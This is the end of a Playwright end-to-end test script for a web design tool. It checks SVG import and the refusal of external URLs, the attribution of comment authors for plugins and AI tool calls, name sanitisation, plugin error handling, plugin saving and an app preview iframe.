     try { await dt.tool("create_nodes", { nodes: [{ type: "svg", name: "Bad2", width: 10, height: 10, svg: '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://example.com/a.png"/></svg>' }] }); } catch (e) { err2 = e.message; }
     await dt.tool("create_nodes", { nodes: [{ type: "text", name: "RESULT", text: err + " | " + err2 }] });`,
    "SVG importer",
  );
  await run(page, "svg");
  await waitStopped(page, 5000);
  await sleep(300);
  const icon = (await named(page, "Icon"))[0];
  const iconKids = icon ? (await nodes(page)).filter((n) => n.parent === icon.id).length : 0;
  check("Z-02: an svg with xmlns and xmlns:xlink imports (a frame of vector layers)", !!icon && iconKids >= 2, `${icon?.type}, ${iconKids} children`);
  const result = (await named(page, "RESULT"))[0];
  const resultText = result ? JSON.stringify(result).match(/web addresses[^"]*/g)?.length : 0;
  check("Z-02: an imageUrl https address and a real web address inside svg are still refused", resultText >= 2 || (result && /web addresses/.test(JSON.stringify(result))), JSON.stringify(result?.text ?? result).slice(0, 200));
  check("Z-02: nothing was created for the refused ones", (await named(page, "Bad")).length === 0 && (await named(page, "Bad2")).length === 0);

  // Z-05
  const cid = await page.evaluate(() => {
    window.__dt.dispatch({ op: "addComment", x: 40, y: 60, text: "Check the contrast here", author: "Ann Ng", time: Date.now() });
    return Object.keys(window.__dt.doc().comments)[0];
  });
  await addPlugin(page, "reply", `await dt.tool("reply_comment", { id: ${JSON.stringify(cid)}, text: "Reply from a plugin", author: "Claude" }); dt.notify("replied");`, "Comment helper");
  await run(page, "reply");
  await waitStopped(page, 4000);
  await sleep(300);
  let msgs = await page.evaluate((id) => window.__dt.doc().comments[id].messages.map((m) => [m.author, m.text]), cid);
  check("Z-05: a plugin's reply is authored '<name> via <plugin>', whatever it passes", msgs.some(([a, t]) => t === "Reply from a plugin" && a === "Dana via Comment helper"), JSON.stringify(msgs));
  const viaClaude = await tool(page, "reply_comment", { id: cid, text: "From Claude", author: "Mallory" });
  msgs = await page.evaluate((id) => window.__dt.doc().comments[id].messages.map((m) => [m.author, m.text]), cid);
  check("Z-05: a Claude tool call still signs as Claude, and can't choose a name", viaClaude.ok && msgs.some(([a, t]) => t === "From Claude" && a === "Claude"), JSON.stringify(msgs));
  const longName = "N".repeat(120);
  await addPlugin(page, "reply2", `await dt.tool("reply_comment", { id: ${JSON.stringify(cid)}, text: "Long" });`, longName);
  await run(page, "reply2");
  await waitStopped(page, 4000);
  msgs = await page.evaluate((id) => window.__dt.doc().comments[id].messages.map((m) => m[0] ?? m.author), cid);
  check("Z-05: the author is cut to 80 characters", Math.max(...msgs.map((a) => a.length)) <= 80 && msgs.some((a) => a.length === 80), JSON.stringify(msgs.map((a) => a.length)));

  // Z-05: a name cut in the middle of a surrogate pair, and control characters in the name.
  const emojiName = "a".repeat(71) + "\u{1F600}" + "tail";
  await addPlugin(page, "reply3", `try { await dt.tool("reply_comment", { id: ${JSON.stringify(cid)}, text: "Emoji" }); dt.notify("REPLY OK"); } catch (e) { dt.notify("REPLY FAILED: " + e.message); }`, emojiName);
  await run(page, "reply3");
  await waitStopped(page, 4000);
  await sleep(300);
  await addPlugin(page, "reply4", `await dt.tool("reply_comment", { id: ${JSON.stringify(cid)}, text: "Control" });`, "Line\nbreak\u0007 name");
  await run(page, "reply4");
  await waitStopped(page, 4000);
  await sleep(300);
  const all = await page.evaluate((id) => window.__dt.doc().comments[id].messages.map((m) => [m.author, m.text]), cid);
  const emojiAuthor = all.find(([, t]) => t === "Emoji")?.[0] ?? "";
  check("Z-05: an author cut inside an emoji does not fail the reply and stays well formed", (await toasts(page)).some((t) => /REPLY OK/.test(t)) && Array.from(emojiAuthor).length === 80 && emojiAuthor === emojiAuthor.toWellFormed(), JSON.stringify(emojiAuthor));
  const ctrlAuthor = all.find(([, t]) => t === "Control")?.[0] ?? "";
  check("Z-05: control characters and newlines in a plugin name become spaces", /^[^\u0000-\u001f\u007f-\u009f]+$/.test(ctrlAuthor) && ctrlAuthor.endsWith("Line break  name"), JSON.stringify(ctrlAuthor));

  // Un-awaited failure
  await addPlugin(page, "unawaited", `dt.tool("update_nodes", { updates: [{ id: "n_missing", name: "x" }] }); await new Promise((r) => setTimeout(r, 1200)); dt.notify("still running");`, "Forgetful");
  const t0 = (await toasts(page)).length;
  await run(page, "unawaited");
  await waitStopped(page, 5000);
  const newToasts = (await toasts(page)).slice(t0);
  check("an un-awaited dt.tool() failure toasts as an error", newToasts.some((t) => /^Plugin “Forgetful”: /.test(t)), JSON.stringify(newToasts));
  check("and the run keeps going to its end", newToasts.some((t) => /still running/.test(t)), JSON.stringify(newToasts));

  // X-11
  const noCode = await tool(page, "save_plugin", { name: "Empty" });
  const blank = await tool(page, "save_plugin", { name: "Blank", code: "   \n " });
  const bad = await tool(page, "save_plugin", { name: "Bad", code: "await (" });
  const good = await tool(page, "save_plugin", { name: "Good", code: 'dt.notify("hi")' });
  check("X-11: save_plugin refuses a missing code", noCode.ok === false && /code is required/.test(noCode.result), JSON.stringify(noCode));
  check("X-11: ... and blank code", blank.ok === false && /code is required/.test(blank.result));
  check("X-11: ... and code that doesn't parse", bad.ok === false && /doesn't parse/.test(bad.result), JSON.stringify(bad));
  check("X-11: valid code saves", good.ok === true && good.result.saved === true);
  const saved = await page.evaluate(() => JSON.parse(localStorage.getItem("dt:plugins")).map((p) => p.name));
  check("X-11: only the valid plugin was stored", saved.includes("Good") && !saved.some((n) => ["Empty", "Blank", "Bad"].includes(n)), JSON.stringify(saved));
  await ctx.close();
}

// ---------- The real App panel preview (needs a vite dev server) ----------
if (process.env.E2E_DEV_URL) {
  console.log("\n# App panel preview iframe (dev server)");
  const dev = process.env.E2E_DEV_URL;
  const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
  await ctx.addInitScript(() => { try { localStorage.setItem("dt:tour-done", "1"); } catch { /* none */ } });
  await ctx.route("**/*", (route) => {
    const u = route.request().url();
    return u.startsWith(dev) || u.startsWith(IN) || u.startsWith(OUTSIDE) || u.startsWith("ws://127.0.0.1") ? route.continue() : route.abort();
  });
  const page = await ctx.newPage();
  await page.goto(dev + "/#/");
  await page.click("button:has-text('New design file')");
  await page.waitForSelector("#dt-canvas");
  await page.evaluate(async (u) => {
    const m = await import("/src/ai/preview.ts");
    m.usePreview.setState({ phase: "running", url: u, project: "app", logs: [] });
    (await import("/src/ai/chatState.ts")).useChat.setState({ bridgeStatus: "connected" });
  }, `${IN}/ok.html`);
  await page.click("#right-tab-app");
  await sleep(300);
  const f = await page.waitForSelector(".app-frame iframe", { timeout: 8000 }).catch(() => null);
  await sleep(1200);
  const fr = page.frames().find((x) => x.url().startsWith(IN));
  const frText = fr ? await fr.evaluate(() => document.body.textContent).catch((e) => "ERR " + e) : null;
  check("the App panel's preview iframe loads a local page", !!f && !!fr && String(frText).includes("ok page"), `iframe ${!!f}, frames ${page.frames().map((x) => x.url()).join(" ")}, text ${frText}`);
  await shot(page, "app-preview");
  await ctx.close();
}

for (const s of servers) s.close();
for (const c of sockets) c.destroy();
await browser.close();
console.log(failed ? `\n${failed} check(s) FAILED` : "\nALL PASS");
process.exit(failed ? 1 : 0);
